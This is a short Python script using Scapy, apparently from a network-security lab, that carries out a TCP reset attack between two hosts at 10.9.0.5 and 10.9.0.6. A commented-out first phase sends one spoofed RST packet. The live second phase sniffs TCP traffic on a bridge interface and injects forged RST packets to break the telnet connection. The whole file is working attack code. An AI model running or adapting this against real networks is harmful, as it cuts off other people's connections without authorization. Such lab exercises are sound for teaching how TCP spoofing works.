#!/usr/bin/env python3
from scapy.all import *

###  this is the first phase of the attack
# ip = IP(src="10.9.0.6", dst="10.9.0.5")
# tcp = TCP(sport=46478, dport=23, flags="R", seq=3122982279)
# pkt = ip/tcp
# ls(pkt)
# send(pkt, verbose=0)

###  this is the second phase of the attack
def print_pkt(pkt):
    if pkt[IP].src == "10.9.0.6" and pkt[IP].dst == "10.9.0.5":
        ip = IP(src="10.9.0.6", dst="10.9.0.5")
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        tcp = TCP(sport=sport, dport=dport, flags="R", seq=pkt[TCP].seq)
        pkt = ip/tcp
        send(pkt, verbose=0)

combined_filter = (
    "tcp"
)

sniff(iface="br-b4db7f32bb2e",filter=combined_filter, prn=print_pkt)
